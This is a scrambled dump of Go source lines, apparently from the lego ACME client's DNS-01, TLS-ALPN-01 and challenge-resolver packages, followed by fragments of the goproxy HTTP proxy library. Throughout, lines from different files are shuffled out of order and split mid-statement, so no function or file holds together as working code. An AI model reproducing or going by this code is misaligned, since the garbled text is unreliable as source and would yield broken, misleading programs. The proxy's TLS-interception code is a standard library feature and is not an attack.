"type WrapPreCheckFunc func(domain, fqdn, value string, check PreCheckFunc) (bool, error)"
// Prevent race condition
// AddPreCheck Allow to define checks before notifying ACME that the DNS challenge is ready.
"return checkAuthoritativeNss(fqdn, value, authoritativeNss)"
"""net"""
// checkDNSPropagation checks if the expected TXT record has been propagated to all authoritative nameservers.
// Initial attempt to resolve at the recursive NS
requireCompletePropagation bool
return nil
func newPreCheck() preCheck {
"return true, nil"
"func checkAuthoritativeNss(fqdn, value string, nameservers []string) (bool, error) {"
var records []string
return preCheck{
func WrapPreCheck(wrap WrapPreCheckFunc) ChallengeOption {
// Deprecated: use WrapPreCheck instead.
"requireCompletePropagation: true,"
// PreCheckFunc checks DNS propagation before notifying ACME that the DNS challenge is ready.
"for _, ns := range nameservers {"
"fqdn = updateDomainWithCName(r, fqdn)"
if check == nil {
package dns01
checkFunc WrapPreCheckFunc
"return p.checkFunc(domain, fqdn, value, p.checkDNSPropagation)"
"func (p preCheck) checkDNSPropagation(fqdn, value string) (bool, error) {"
// checks DNS propagation before notifying ACME that the DNS challenge is ready.
"record := strings.Join(txt.Txt, """")"
"""github.com/miekg/dns"""
"return check(fqdn, value)"
if p.checkFunc == nil {
found = true
"if txt, ok := rr.("
"records = append(records, record)"
"authoritativeNss, err := lookupNameservers(fqdn)"
"""errors"""
dns.TXT)
if record == value {
break
// WrapPreCheck Allow to define checks before notifying ACME that the DNS challenge is ready.
if err != nil {
"return p.checkDNSPropagation(fqdn, value)"
type preCheck struct {
"""strings"""
// require the TXT record to be propagated to all authoritative name servers
"func (p preCheck) call(domain, fqdn, value string) (bool, error) {"
return func(chlg 
"return false, fmt.Errorf(""NS %s returned %s for %s"", ns, dns.RcodeToString[r.Rcode], fqdn)"
"return false, fmt.Errorf(""NS %s did not return the expected TXT record [fqdn: %s, value: %s]: %s"", ns, fqdn, value, strings.Join(records, "" ,""))"
"for _, rr := range r.Answer {"
"dns.Msg, fqdn string) string {"
return fqdn
"import ""github.com/miekg/dns"""
func updateDomainWithCName(r 
if cn.Hdr.Name == fqdn {
package dns01
// Update FQDN with CNAME if any
return cn.Target
"if cn, ok := rr.("
dns.CNAME)
"for _, rr := range r.Answer {"
 ok {
"fqdn, value := GetRecord(authz.Identifier.Value, keyAuth)"
type sequential interface {
DefaultTTL = 120
func NewChallenge(core 
const (
return func(
"stop, errP := c.preCheck.call(domain, fqdn, value)"
Challenge) error
type ChallengeOption func(
"err = c.provider.Present(authz.Identifier.Value, chlng.Token, keyAuth)"
default:
"""os"""
"""github.com/go-acme/lego/v3/platform/wait"""
"var timeout, interval time.Duration"
return nil
// Check if the domain has CNAME then return that
err := opt(chlg)
"""github.com/go-acme/lego/v3/log"""
// DefaultTTL default TTL
package dns01
// NoOp options
if err == nil 
"log.Infof(""[%s] acme: Trying to solve DNS-01"", domain)"
// DefaultPropagationTimeout default propagation timeout
"return ok, p.Sequential()"
 r.Rcode == dns.RcodeSuccess {
 challenge
"func GetRecord(domain, keyAuth string) (fqdn string, value string) {"
value = base64.RawURLEncoding.EncodeToString(keyAuthShaBytes[:sha256.Size])
"""github.com/miekg/dns"""
"keyAuth, err := c.core.GetKeyAuthorization(chlng.Token)"
keyAuthShaBytes := sha256.Sum256([]byte(keyAuth))
if !stop 
"""strconv"""
"func CondOption(condition bool, opt ChallengeOption) ChallengeOption {"
DefaultPropagationTimeout = 60 
preCheck   preCheck
" time.Second,"
return opt
 time.Second
"log.Infof(""[%s] acme: Checking DNS record propagation using %"
"return fmt.Errorf(""[%s] acme: no DNS Provider configured"", domain)"
"""encoding/base64"""
Challenge) error {
"timeout, interval = provider.Timeout()"
if !condition {
"return fmt.Errorf(""[%s] acme: error presenting token: %s"", domain, err)"
Challenge {
// Challenge implements the dns-01 challenge
type ValidateFunc func(core 
"return c.provider.CleanUp(authz.Identifier.Value, chlng.Token, keyAuth)"
// CondOption Conditional challenge option.
return err
"err = wait.For(""propagation"", timeout, interval, func() (bool, error) {"
"if p, ok := c.provider.(sequential)"
"""crypto/sha256"""
"Challenge) Sequential() (bool, time.Duration) {"
"log.Infof(""challenge option error: %v"", err)"
provider   challenge.Provider
"""github.com/go-acme/lego/v3/acme/api"""
return chlg
"log.Infof(""[%s] acme: Preparing to solve DNS-01"", domain)"
if err != nil {
"for _, opt := range opts {"
"return false, 0"
 ok {
"""fmt"""
"return stop, errP"
"return c.validate(c.core, domain, chlng)"
import (
api.Core
// PreSolve just submits the txt record to the dns provider.
// GetRecord returns a DNS record which will fulfill the 
"timeout, interval = DefaultPropagationTimeout, DefaultPollingInterval"
core       
"core:       core,"
domain := challenge.GetTargetedDomain(authz)
Challenge) Solve(authz acme.Authorization) error {
"// It does not validate record propagation, or do anything at all with the acme server."
func (c 
validate   ValidateFunc
"validate:   validate,"
"fqdn = updateDomainWithCName(r, fqdn)"
"r, err := dnsQuery(fqdn, dns.TypeCNAME, recursiveNameservers, true)"
Sequential() time.Duration
"if ok, _ := strconv.ParseBool(os.Getenv(""LEGO_EXPERIMENTAL_CNAME_SUPPORT""))"
"""github.com/go-acme/lego/v3/challenge"""
"api.Core, validate ValidateFunc, provider challenge.Provider, opts ...ChallengeOption) "
if c.provider == nil {
Challenge) PreSolve(authz acme.Authorization) error {
chlg := 
"""time"""
switch provider := c.provider.(type) {
Challenge) CleanUp(authz acme.Authorization) error {
DefaultPollingInterval = 2 
 errP != nil {
chlng.KeyAuthorization = keyAuth
"chlng, err := challenge.FindChallenge(challenge.DNS01, authz)"
// base64URL encoding without padding
"fqdn = fmt.Sprintf(""_acme-challenge.%s."", domain)"
dns-01
"preCheck:   newPreCheck(),"
// Generate the Key Authorization for the challenge
dnsTimeout: 10 
"""github.com/go-acme/lego/v3/acme"""
"log.Infof(""[%s] acme: Cleaning DNS-01 challenge"", challenge.GetTargetedDomain(authz))"
"api.Core, domain string, chlng acme.Challenge) error"
"v"", domain, recursiveNameservers)"
// CleanUp cleans the challenge.
dnsTimeout time.Duration
case challenge.ProviderTimeout:
type Challenge struct {
return
"provider:   provider,"
Challenge{
"log.Infof(""[%s] acme: Waiting for DNS record propagation."", domain)"
// DefaultPollingInterval default polling interval
func UnFqdn(name string) string {
func ToFqdn(name string) string {
 name[n-1] == '.' {
return name 
if n != 0 
// ToFqdn converts the name into a fqdn appending a trailing dot.
n := len(name)
return name
package dns01
return name[:n-1]
if n == 0 
// UnFqdn converts the fqdn into a name removing the trailing dot.
" ""."""
"in, err = dnsQuery(domain, dns.TypeSOA, nameservers, true)"
case dns.RcodeSuccess:
udp := 
defer muFqdnToZone.Unlock()
"for _, ans := range msg.Answer {"
case dns.RcodeNameError:
var err error
default:
"for _, index := range labelIndexes {"
 in.Truncated {
if in != nil 
var in 
// ensure all servers have a port number
return func(_ 
return nil
// CNAME records cannot/should not exist at the root of a zone.
"func getNameservers(path string, defaults []string) []string {"
"dns.Msg, error) {"
if msg != nil {
dnsTimeout = timeout
"const defaultResolvConf = ""/etc/resolv.conf"""
"resolvers = append(resolvers, net.JoinHostPort(resolver, ""53""))"
package dns01
"resolvers = append(resolvers, resolver)"
if err == nil 
dns.Msg) bool {
if in == nil {
"m := createDNSMsg(fqdn, rtype, recursive)"
func dnsMsgContainsCNAME(msg 
"""github.com/miekg/dns"""
"if ns, ok := rr.("
fqdnToZone   = map[string]string{}
" strings.Join(parts, "" "")"
zone := soa.Hdr.Name
"return nil, fmt.Errorf(""could not determine authoritative nameservers"")"
dns.Msg {
"""strings"""
"if zone, ok := fqdnToZone[fqdn]"
domain := fqdn[index:]
return m
"func lookupNameservers(fqdn string) ([]string, error) {"
 time.Second
"if _, _, err := net.SplitHostPort(resolver)"
"""google-public-dns-b.google.com:53"","
func sendDNSQuery(m 
Challenge) error {
muFqdnToZone sync.Mutex
// Do we have it cached
labelIndexes := dns.Split(fqdn)
dns.CNAME)
"return """""
"m.SetEdns0(4096, false)"
switch in.Rcode {
// dnsMsgContainsCNAME checks for a CNAME answer in msg
"dns.Msg, err error) string {"
"parts = append(parts, fmt.Sprintf(""%v"", err))"
"""google-public-dns-a.google.com:53"","
// by recursing up the domain labels until the nameserver returns a SOA record in the answer section.
"if _, ok := ans.("
"in, _, err := udp.Exchange(m, ns)"
if !recursive {
if err != nil 
return defaults
return resolvers
continue
// So we skip a domain when a CNAME is found.
"func createDNSMsg(fqdn string, rtype uint16, recursive bool) "
 err != nil {
"return """", fmt.Errorf(""unexpected response code '%s' for %s"", dns.RcodeToString[in.Rcode], domain)"
var resolvers []string
var dnsTimeout = 10 
// ClearFqdnCache clears the cache of fqdn to zone mappings. Primarily used in testing.
} else {
func formatDNSError(msg 
break
"return """", fmt.Errorf(""could not find the start of authority for %s%s"", fqdn, formatDNSError(in, err))"
if err != nil {
return true
 ok {
// Any response code other than NOERROR and NXDOMAIN is treated as error
muFqdnToZone.Unlock()
"""fmt"""
m := new(dns.Msg)
"m.SetQuestion(fqdn, rtype)"
// dnsTimeout is used to override the default DNS timeout of 10 seconds.
import (
// NXDOMAIN
"return in, err"
"return zone, nil"
// Check if we got a SOA RR in the answer section
func AddRecursiveNameservers(nameservers []string) ChallengeOption {
"config, err := dns.ClientConfigFromFile(path)"
"dns.Msg, ns string) ("
// FindZoneByFqdn determines the zone apex for the given fqdn
"func dnsQuery(fqdn string, rtype uint16, nameservers []string, recursive bool) ("
// FindZoneByFqdnCustom determines the zone apex for the given fqdn
if len(parts) > 0 {
"r, err := dnsQuery(zone, dns.TypeNS, recursiveNameservers, true)"
"""net"""
recursiveNameservers = ParseNameservers(nameservers)
"func FindZoneByFqdn(fqdn string) (string, error) {"
if len(in.Answer) == 0 {
"dns.Client{Net: ""udp"", Timeout: dnsTimeout}"
"// If the TCP request succeeds, the err will reset to nil"
"in, err = sendDNSQuery(m, ns)"
"func FindZoneByFqdnCustom(fqdn string, nameservers []string) (string, error) {"
"zone, err := FindZoneByFqdn(fqdn)"
tcp := 
"""time"""
"var recursiveNameservers = getNameservers(defaultResolvConf, defaultNameservers)"
"for _, rr := range r.Answer {"
"if soa, ok := ans.("
"return nil, err"
 len(config.Servers) == 0 {
func ParseNameservers(servers []string) []string {
var parts []string
func AddDNSTimeout(timeout time.Duration) ChallengeOption {
if len(authoritativeNss) > 0 {
func ClearFqdnCache() {
var defaultNameservers = []string{
"return FindZoneByFqdnCustom(fqdn, recursiveNameservers)"
dns.SOA)
"for _, resolver := range servers {"
// getNameservers attempts to get systems nameservers before falling back to the defaults
// recursiveNameservers are used to pre-check DNS propagation
fqdnToZone = map[string]string{}
return false
muFqdnToZone.Lock()
"return authoritativeNss, nil"
if dnsMsgContainsCNAME(in) {
m.RecursionDesired = false
"authoritativeNss = append(authoritativeNss, strings.ToLower(ns.Ns))"
dns.Msg
"for _, ns := range nameservers {"
"""sync"""
"parts = append(parts, dns.RcodeToString[msg.Rcode])"
 len(in.Answer) > 0 {
dns.NS)
var authoritativeNss []string
"return nil, fmt.Errorf(""could not determine the zone: %v"", err)"
"for _, ans := range in.Answer {"
fqdnToZone[fqdn] = zone
"return "": "" "
"in, _, err = tcp.Exchange(m, ns)"
var (
"dns.Client{Net: ""tcp"", Timeout: dnsTimeout}"
return ParseNameservers(config.Servers)
// lookupNameservers returns the authoritative nameservers for the given fqdn.
func NewChallenge(core 
rsa.PrivateKey)
"Critical: true,"
"return tempCertPEM, rsaPrivatePEM, nil"
"cert, err := tls.X509KeyPair(tempCertPEM, rsaPrivatePEM)"
"tempPrivateKey, err := certcrypto.GeneratePrivateKey(certcrypto.RSA2048)"
"var idPeAcmeIdentifierV1 = asn1.ObjectIdentifier{1, 3, 6, 1, 5, 5, 7, 1, 31}"
section-5.1
core     
"""encoding/asn1"""
"""github.com/go-acme/lego/v3/log"""
// Compute the SHA-256 digest of the key authorization.
"keyAuth, err := c.core.GetKeyAuthorization(chlng.Token)"
tls-alpn-01
// (marked as critical such that it won't be used by non-ACME software).
"func ChallengeCert(domain, keyAuth string) ("
// Generate a new RSA key for the certificates.
"chlng, err := challenge.FindChallenge(challenge.TLSALPN01, authz)"
// Solve manages the provider to validate and solve the challenge.
// idPeAcmeIdentifierV1 is the SMI Security for PKIX Certification Extension OID referencing the ACME extension.
 challenge.
Challenge {
type ValidateFunc func(core 
"tls.Certificate, error) {"
package tlsalpn01
// Reference: https://tools.ietf.org/html/draft-ietf-acme-tls-alpn-05
return err
"return fmt.Errorf(""[%s] acme: error presenting token: %v"", challenge.GetTargetedDomain(authz), err)"
"""crypto/sha256"""
"""github.com/go-acme/lego/v3/certcrypto"""
"""github.com/go-acme/lego/v3/acme/api"""
"Id:       idPeAcmeIdentifierV1,"
if err != nil {
// Add the keyAuth digest as the acmeValidation-v1 extension
"""fmt"""
"log.Warnf(""[%s] acme: error cleaning up: %v"", challenge.GetTargetedDomain(authz), err)"
zBytes := sha256.Sum256([]byte(keyAuth))
"return c.validate(c.core, domain, chlng)"
import (
"tempCertPEM, rsaPrivatePEM, err := ChallengeBlocks(domain, keyAuth)"
validate ValidateFunc
api.Core
domain := authz.Identifier.Value
"provider: provider,"
"func ChallengeBlocks(domain, keyAuth string) ([]byte, []byte, error) {"
Challenge) Solve(authz acme.Authorization) error {
Challenge) SetProvider(provider challenge.Provider) {
defer func() {
func (c 
"err := c.provider.CleanUp(domain, chlng.Token, keyAuth)"
"core:     core,"
"""github.com/go-acme/lego/v3/challenge"""
"value, err := asn1.Marshal(zBytes[:sha256.Size])"
"tempCertPEM, err := certcrypto.GeneratePemCert(rsaPrivateKey, domain, extensions)"
"// ChallengeBlocks returns PEM blocks (certPEMBlock, keyPEMBlock) with the acmeValidation-v1 extension"
return 
"""crypto/rsa"""
rsaPrivatePEM := certcrypto.PEMEncode(rsaPrivateKey)
"log.Infof(""[%s] acme: Trying to solve TLS-ALPN-01"", challenge.GetTargetedDomain(authz))"
chlng.KeyAuthorization = keyAuth
// Encode the private key into a PEM format. We'll need to use it to generate the x509 keypair.
"// Generate the PEM certificate using the provided private key, domain, and extra extensions."
"return nil, err"
rsaPrivateKey := tempPrivateKey.(
extensions := []pkix.Extension{
"api.Core, validate ValidateFunc, provider challenge.Provider) "
// and domain name for the 
// Generate the Key Authorization for the challenge
"""github.com/go-acme/lego/v3/acme"""
c.provider = provider
"api.Core, domain string, chlng acme.Challenge) error"
section-3
"Value:    value,"
"return nil, nil, err"
type Challenge struct {
"validate: validate,"
"err = c.provider.Present(domain, chlng.Token, keyAuth)"
// ChallengeCert returns a certificate with the acmeValidation-v1 extension
"""crypto/tls"""
provider challenge.Provider
Challenge{
"cert, nil"
"""crypto/x509/pkix"""
// ACMETLS1Protocol is the ALPN Protocol ID for the ACME-TLS/1 Protocol.
"""fmt"""
"return fmt.Errorf(""could not start HTTPS server for challenge -> %v"", err)"
// so that it can serve the correct details.
s.port = defaultTLSPort
import (
acme-tls/1
type ProviderServer struct {
tlsConf.Certificates = []tls.Certificate{
go func() {
// We must set that the 
tlsConf.NextProtos = []string{ACMETLS1Protocol}
"ACMETLS1Protocol = ""acme-tls/1"""
 err != nil 
 err != http.ErrServerClosed {
listener net.Listener
"cert, err := ChallengeCert(domain, keyAuth)"
// Shut the server down when we're finished.
 challenge.
section-5.2
cert}
"ProviderServer) CleanUp(domain, token, keyAuth string) error {"
if err := s.listener.Close()
"""net"""
port     string
// if you want only to use the default values.
// defaultTLSPort is the port that the ProviderServer will default to
// Generate the challenge certificate using the provided keyAuth and domain.
return nil
if err != nil 
// Fallback to port 443 if the port was not provided.
// Present generates a certificate with a SHA-256 digest of the keyAuth provided
package tlsalpn01
TLS-ALPN-01
ProviderServer) GetAddress() string {
// Create the listener with the created tls.Config.
"""github.com/go-acme/lego/v3/log"""
// NewProviderServer creates a new ProviderServer on the selected interface and port.
// so that the protocol negotiation can succeed. Reference:
"ProviderServer{iface: iface, port: port}"
"return net.JoinHostPort(s.iface, s.port)"
 application level protocol is supported
func (s 
return err
// https://tools.ietf.org/html/draft-ietf-acme-tls-alpn-01
"if s.port == """" {"
"s.listener, err = tls.Listen(""tcp"", s.GetAddress(), tlsConf)"
"defaultTLSPort = ""443"""
if s.listener == nil {
"// Server was created, close it."
// when no other port is provided.
// ProviderServer implements ChallengeProvider for 
"func NewProviderServer(iface, port string) "
// as the acmeValidation-v1 extension value to conform to the ACME-TLS-ALPN spec.
iface    string
// Place the generated certificate with the extension into the TLS config
// CleanUp closes the HTTPS server.
// It may be instantiated without using the NewProviderServer
log.Println(err)
"err := http.Serve(s.listener, nil)"
"// the ""any"" interface and port 443 respectively."
if err != nil {
tlsConf := new(tls.Config)
"""crypto/tls"""
// Setting iface and / or port to an empty string will make the server fall back to
"""net/http"""
"""strings"""
return 
"ProviderServer) Present(domain, token, keyAuth string) error {"
" !strings.Contains(err.Error(), ""use of closed network connection"") {"
const (
ProviderServer {
"n"", domain, e[domain]))"
"""fmt"""
"""bytes"""
"""sort"""
// obtainError is returned when there are specific errors available per domain.
import (
type obtainError map[string]error
func (e obtainError) Error() string {
for domain := range e {
"buffer.WriteString(fmt.Sprintf(""[%s] %s"
var domains []string
"buffer := bytes.NewBufferString(""acme: Error -> One or more domains had a problem:"
"for _, domain := range domains {"
return buffer.String()
"domains = append(domains, domain)"
sort.Strings(domains)
package resolver
return solvr
"""github.com/go-acme/lego/v3/challenge/tlsalpn01"""
"// After the path is sent, the ACME server will access our server."
solvers map[challenge.Type]solver
api.Core) 
bo.InitialInterval = initialInterval
 initialInterval
if valid {
core    
"api.Core, domain string, chlg acme.Challenge) error {"
default:
"func (a byType) Less(i, j int) bool { return a[i].Type > a[j].Type }"
"c.solvers[challenge.TLSALPN01] = tlsalpn01.NewChallenge(c.core, validate, p)"
ra = 5
SolverManager {
return nil
bo.MaxInterval = 10 
"return false, nil"
"""github.com/go-acme/lego/v3/log"""
operation := func() error {
case acme.StatusValid:
bo := backoff.NewExponentialBackOff()
"""context"""
"func checkChallengeStatus(chlng acme.ExtendedChallenge) (bool, error) {"
"""strconv"""
// SetDNS01Provider specifies a custom provider p that can solve the given DNS-01 challenge.
case acme.StatusInvalid:
"""errors"""
"return false, errors.New(""the server returned an unexpected state"")"
"c.solvers[challenge.DNS01] = dns01.NewChallenge(c.core, validate, p, opts...)"
// Allow to have a deterministic challenge order
SolverManager) SetHTTP01Provider(p challenge.Provider) error {
 time.Second
"log.Infof(""[%s] acme: Could not find solver for: %s"", domain, chlg.Type)"
// Remove Remove a challenge type from the available solvers.
// Checks all challenges from the server in order and returns the first matching solver.
// Boulder does not implement the ability to retry challenges or the Retry-After header.
"return true, nil"
"if solvr, ok := c.solvers[challenge.Type(chlg.Type)]"
SolverManager) SetTLSALPN01Provider(p challenge.Provider) error {
"return backoff.Retry(operation, backoff.WithContext(bo, ctx))"
SolverManager) chooseSolver(authz acme.Authorization) solver {
return err
// https://github.com/letsencrypt/boulder/blob/master/docs/acme-divergences.md
sort.Sort(byType(authz.Challenges))
"""github.com/go-acme/lego/v3/acme/api"""
if err != nil {
 ok {
"""fmt"""
"valid, err := checkChallengeStatus(chlng)"
type SolverManager struct {
import (
// Repeatedly check the server for an updated status on our request.
"for _, chlg := range authz.Challenges {"
"case acme.StatusDeactivated, acme.StatusExpired, acme.StatusRevoked:"
api.Core
cancel()
"return false, chlng.Error"
"// If it doesn't, we'll just poll hard."
"return false, fmt.Errorf(""the authorization state %s"", authz.Status)"
"delete(c.solvers, chlgType)"
"""github.com/go-acme/lego/v3/challenge/dns01"""
"ra, err := strconv.Atoi(chlng.RetryAfter)"
switch chlng.Status {
domain := challenge.GetTargetedDomain(authz)
"return false, chlg.Error"
"""github.com/go-acme/lego/v3/challenge/http01"""
// SetTLSALPN01Provider specifies a custom provider p that can solve the given TLS-ALPN-01 challenge.
func (c 
"c.solvers[challenge.HTTP01] = http01.NewChallenge(c.core, validate, p)"
"ctx, cancel := context.WithCancel(context.Background())"
"return errors.New(""the server didn't respond to our request"")"
"SolverManager) SetDNS01Provider(p challenge.Provider, opts ...dns01.ChallengeOption) error {"
"return fmt.Errorf(""failed to initiate challenge: %v"", err)"
"authz, err := core.Authorizations.Get(chlng.AuthorizationURL)"
"""github.com/go-acme/lego/v3/challenge"""
initialInterval := time.Duration(ra) 
package resolver
"valid, err := checkAuthorizationStatus(authz)"
// SetHTTP01Provider specifies a custom provider p that can solve the given HTTP-01 challenge.
// The ACME server MUST return a Retry-After.
"log.Infof(""[%s] acme: use %s solver"", domain, chlg.Type)"
"""time"""
"chlng, err := core.Challenges.New(chlg.URL)"
switch authz.Status {
return 
"""github.com/cenkalti/backoff/v3"""
SolverManager{
func validate(core 
func NewSolversManager(core 
"core:    core,"
bo.MaxElapsedTime = 100 
"func (a byType) Swap(i, j int)      { a[i], a[j] = a[j], a[i] }"
if chlg.Status == acme.StatusInvalid 
section-82
type byType []acme.Challenge
"log.Infof(""[%s] The server validated our request"", domain)"
"func checkAuthorizationStatus(authz acme.Authorization) (bool, error) {"
"""github.com/go-acme/lego/v3/acme"""
SolverManager) Remove(chlgType challenge.Type) {
 chlg.Error != nil {
func (a byType) Len() int           { return len(a) }
"case acme.StatusPending, acme.StatusProcessing:"
"""sort"""
"solvers: map[challenge.Type]solver{},"
// Solve challenge
type sequential interface {
failures := make(obtainError)
if authz.Status == acme.StatusValid {
failures[challenge.GetTargetedDomain(authz)] = err
"solverManager: solverManager,"
default:
"for _, authSolver := range authSolvers {"
SolverManager) 
// Boulder might recycle recent validated authz (see issue 
return nil
var authSolversSequential []
"""github.com/go-acme/lego/v3/log"""
authz := authSolver.authz
"if solvr, ok := solvr.(cleanup)"
err := authSolver.solver.Solve(authSolver.authz)
// Submit the challenge
"// For all valid preSolvers, first submit the challenges so they have max time to propagate"
// First pass just selects a solver for each authz.
time.Sleep(interval)
"failures[domain] = fmt.Errorf(""[%s] acme: could not determine solvers"", domain)"
authz  acme.Authorization
"for i, authSolver := range authSolvers {"
PreSolve(authorization acme.Authorization) error
if len(authSolvers)-1 > i {
switch s := solvr.(type) {
"authSolversSequential = append(authSolversSequential, authSolver)"
"sequentialSolve(authSolversSequential, failures)"
if failures[domain] != nil {
func sequentialSolve(authSolvers []
authSolver := 
type preSolver interface {
// This saves quite a bit of time vs creating the records and solving them serially.
continue
err := authSolver.solver.Solve(authz)
"// Interface for challenges like dns, where we can set a record in advance for ALL challenges."
type cleanup interface {
"func cleanUp(solvr solver, authz acme.Authorization) {"
// for even an empty obtainError is a non-nil error value
Prober{
} else {
solverManager 
case sequential:
selectedAuthSolver
267)
if err != nil {
"parallelSolve(authSolvers, failures)"
 ok {
// Interface for all challenge solvers to implement.
"""fmt"""
type selectedAuthSolver struct {
import (
"for _, authz := range authorizations {"
"_, interval := solvr.Sequential()"
solvr := authSolver.solver.(sequential)
"if ok, _ := s.Sequential()"
// already failed in previous loop
Solve(authorization acme.Authorization) error
domain := challenge.GetTargetedDomain(authz)
"// Be careful not to return an empty failures map,"
defer func() {
// Clean all created TXT records
// an authz with the solver we have chosen and the index of the challenge associated with it
// Solve Looks through the challenge combinations to find a solvable match.
solver solver
// Clean challenge
CleanUp(authorization acme.Authorization) error
// Finally solve all challenges for real
func NewProber(solverManager 
"""github.com/go-acme/lego/v3/challenge"""
package resolver
var authSolvers []
if len(failures) > 0 {
"""time"""
"// Interface for challenges like dns, where we can solve all the challenges before to delete them."
return 
"selectedAuthSolver{authz: authz, solver: solvr}"
if solvr := p.solverManager.chooseSolver(authz)
err := solvr.PreSolve(authSolver.authz)
err := solvr.CleanUp(authz)
Prober {
domain := challenge.GetTargetedDomain(authSolver.authz)
"if solvr, ok := authSolver.solver.(preSolver)"
type Prober struct {
"log.Infof(""[%s] acme: authorization already valid"
SolverManager
 solvr != nil {
return failures
"""github.com/go-acme/lego/v3/acme"""
// Then solves the challenges in series and returns.
func (p 
"selectedAuthSolver, failures obtainError) {"
"authSolvers = append(authSolvers, authSolver)"
"// Loop through the resources, basically through the domains."
failures[domain] = err
err := solvr.PreSolve(authz)
"cleanUp(authSolver.solver, authSolver.authz)"
" skipping challenge"", domain)"
func parallelSolve(authSolvers []
type solver interface {
"Sequential() (bool, time.Duration)"
"log.Warnf(""[%s] acme: error cleaning up: %v "", domain, err)"
"log.Infof(""sequence: wait for %s"", interval)"
Prober) Solve(authorizations []acme.Authorization) error {
"for _, h := range proxy.reqHandlers {"
"http.Request, ctx "
"dst.Add(k, v)"
// and return canned response instead.
if ctx.Error != nil {
"ProxyHttpServer) ServeHTTP(w http.ResponseWriter, r "
http.Transport
// non-nil resp means the handler decided to skip sending the request
var err error
"reqHandlers:   []ReqHandler{},"
"""os"""
"""sync/atomic"""
"errorString = ""error read response "" "
"ProxyCtx{Req: r, Session: atomic.AddInt64("
NonproxyHandler http.Handler
if origBody != resp.Body {
"resp = proxy.filterResponse(resp, ctx)"
// 14.10 Connection
"http.Error(w, ctx.Error.Error(), 500)"
"ctx.Logf(""Sending request %v %v"", r.Method, r.URL.String())"
// if nil Tr.Dial will be used
"for _, v := range vs {"
ctx.Resp = resp
"ConnectDial func(network string, addr string) (net.Conn, error)"
if !keepDestHeaders {
"r.Header.Del(""Accept-Encoding"")"
func removeProxyHeaders(ctx 
Verbose         bool
"_, err := r.Peek(1)"
proxy.ConnectDial = dialerFromEnv(
"if r.Method == ""CONNECT"" {"
"r, resp := proxy.filterRequest(r, ctx)"
ProxyCtx) (req 
proxy := ProxyHttpServer{
// KeepDestinationHeaders indicates the proxy should retain any headers present in the http.Response before proxying
reqHandlers     []ReqHandler
if err := resp.Body.Close()
if !r.URL.IsAbs() {
// the Content-Length header should be set.
"respHandlers:  []RespHandler{},"
var errorString string
// We keep the original body to remove the header only if things changed.
for k := range dst {
func NewProxyHttpServer() 
// and would wrap the response body with the relevant reader.
//   The Connection general-header field allows the sender to specify
origBody := resp.Body
"req, resp = h.Handle(r, ctx)"
//   options that are desired for that particular connection and MUST NOT
"ProxyCtx, r "
"r.RequestURI = """" // this must be reset when serving a request with the client"
"ctx.Logf(""Copying response to client %v [%d]"", resp.Status, resp.StatusCode)"
"""regexp"""
req = r
if err == io.EOF {
" "" : "" "
package goproxy
"ctx.Logf(""Received response %v"", resp.Status)"
 err != nil {
"http.Error(w, ""This is a proxy server. Does not respond to non-proxy requests."", 500)"
"// If no Accept-Encoding header exists, Transport will add the headers it can accept"
} else {
"for k, vs := range src {"
break
"proxy.sess, 1), proxy: proxy}"
proxy
// The basic proxy type. Implements http.Handler.
ProxyHttpServer) filterRequest(r 
return true
if err != nil {
"resp = proxy.filterResponse(nil, ctx)"
w.WriteHeader(resp.StatusCode)
"""net/http"""
"// This will prevent problems with HEAD requests where there's no body, yet,"
"resp, err = ctx.RoundTrip(r)"
"httpsHandlers: []HttpsHandler{},"
// http.ResponseWriter will take care of filling the correct response length
"// Setting it now, might impose wrong value, contradicting the actual new"
// setting Verbose to true will log information on each request sent to the proxy
"removeProxyHeaders(ctx, r)"
import (
respHandlers    []RespHandler
proxy)
"""log"""
"for _, h := range proxy.respHandlers {"
type ProxyHttpServer struct {
"http.Response, ctx "
"resp = h.Handle(resp, ctx)"
"r.Header.Del(""Connection"")"
Tr: 
"""net"""
"ctx.Logf(""Copied %v bytes to client error=%v"", nr, err)"
Logger          Logger
// http://www.w3.org/Protocols/rfc2616/rfc2616.txt
"r.Header.Del(""Proxy-Authenticate"")"
defer origBody.Close()
"nr, err := io.Copy(w, resp.Body)"
"http.Request, resp "
ctx.Logf(errorString)
"ctx.Warnf(""Can't close response body %v"", err)"
"http.Transport{TLSClientConfig: tlsClientSkipVerify, Proxy: http.ProxyFromEnvironment},"
// ConnectDial will be used to create TCP connections for CONNECT requests
"// Standard net/http function. Shouldn't be used directly, http.Serve will use it."
if resp == nil {
// see http://golang.org/src/pkg/sync/atomic/doc.go
"http.Error(w, errorString, 500)"
ctx := 
http.Response) {
//   be communicated by proxies over further connections.
"copyHeaders(w.Header(), resp.Header, proxy.KeepDestinationHeaders)"
return 
bufio.Reader) bool {
"ctx.Logf(""Got request %v %v %v %v"", r.URL.Path, r.Host, r.Method, r.URL.String())"
"proxy.NonproxyHandler.ServeHTTP(w, r)"
// https://jdebp.eu./FGA/web-proxy-connection-header.html
"r.Header.Del(""Proxy-Authorization"")"
"r.Header.Del(""Proxy-Connection"")"
ctx.Error = err
var hasPort = regexp.MustCompile(
resp = respOrig
sess int64
"resp.Header.Del(""Content-Length"")"
"// NewProxyHttpServer creates and returns a proxy server, logging to stderr by default"
"NonproxyHandler: http.HandlerFunc(func(w http.ResponseWriter, req "
"Logger:        log.New(os.Stderr, """", log.LstdFlags),"
return false
func isEof(r 
// body the user returned.
Tr              
dst.Del(k)
CertStore   CertStorage
"""io"""
ProxyHttpServer {
ProxyCtx) (resp 
// session variable must be aligned in i386
http.Request) {
"""bufio"""
ProxyHttpServer) filterResponse(respOrig 
"func copyHeaders(dst, src http.Header, keepDestHeaders bool) {"
"// Connection, Authenticate and Authorization are single hop Header:"
func (proxy 
"proxy.handleHttps(w, r)"
return
httpsHandlers   []HttpsHandler
"// curl can add that, see"
"//r.Header[""X-Forwarded-For""] = w.RemoteAddr()"
 r.URL.Host
 r.URL.Host 
KeepDestinationHeaders bool
 ctx.Error.Error()
if resp != nil {
text = text[len(statusCode):]
"c, err := proxy.dial(network, u.Host)"
"ProxyHttpServer) connectDial(network, addr string) (c net.Conn, err error) {"
"req, err := http.ReadRequest(client)"
text := resp.Status
type ConnectActionLiteral int
clientTlsReader := bufio.NewReader(rawClientTls)
case ConnectProxyAuthHijack:
go func() {
"if u.Scheme == """" "
"config.Certificates = append(config.Certificates, "
OkConnect       = 
ConnectHijack
"go copyAndClose(ctx, proxyClientTCP, targetTCP)"
"""io/ioutil"""
wg.Add(2)
"ctx.Warnf(""Cannot write TLS response HTTP status from mitm'd client: %v"", err)"
